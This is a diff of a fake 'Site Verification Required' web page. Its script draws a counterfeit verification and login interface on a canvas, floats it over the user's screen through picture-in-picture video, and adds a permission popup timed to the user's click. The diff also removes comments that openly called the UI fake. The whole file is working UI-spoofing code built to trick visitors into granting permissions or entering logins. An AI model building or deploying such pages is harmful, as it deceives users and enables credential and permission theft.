@@ -31,22 +31,26 @@ video {
 <h2 style="position:absolute;top:200px;">Site Verification Required</h2>
 <button onclick="start()">Verify</button>
 
-<!-- Fake video container -->
 <video id="vid" playsinline></video>
 
 <script>
 async function start() {
+  // 🔥 Open permission popup FIRST (same user gesture)
+  const popup = window.open(
+    "permission.html",
+    "perm",
+    "width=300,height=200,left=900,top=600"
+  );
+
   const video = document.getElementById("vid");
 
-  // Create canvas to simulate UI inside video
   const canvas = document.createElement("canvas");
   canvas.width = 400;
   canvas.height = 500;
   const ctx = canvas.getContext("2d");
 
-  // Draw fake UI continuously (so it looks alive)
   function drawUI(step = 1) {
-    ctx.fillStyle = "#ffffff";
+    ctx.fillStyle = "#fff";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
 
     ctx.fillStyle = "#000";
@@ -54,7 +58,7 @@ async function start() {
 
     if (step === 1) {
       ctx.fillText("Step 1: Verification", 80, 100);
-      ctx.fillText("Click Continue below", 70, 140);
+      ctx.fillText("Follow instructions in the popup", 40, 140);
 
       ctx.fillStyle = "#0dd438";
       ctx.fillRect(100, 200, 200, 50);
@@ -75,21 +79,25 @@ async function start() {
     }
   }
 
-  // Animate UI (simple step switch)
-  let currentStep = 1;
-  drawUI(currentStep);
+  let step = 1;
+  drawUI(step);
 
+  // Switch to login step after a few seconds
   setTimeout(() => {
-    currentStep = 2;
-    drawUI(currentStep);
-  }, 3000);
+    step = 2;
+    drawUI(step);
+  }, 4000);
 
-  // Capture canvas as stream
   const stream = canvas.captureStream(30);
   video.srcObject = stream;
 
   await video.play();
   await video.requestPictureInPicture();
+
+  // Optional: auto close popup later (to simulate flow)
+  setTimeout(() => {
+    if (popup) popup.close();
+  }, 8000);
 }
 </script>
 
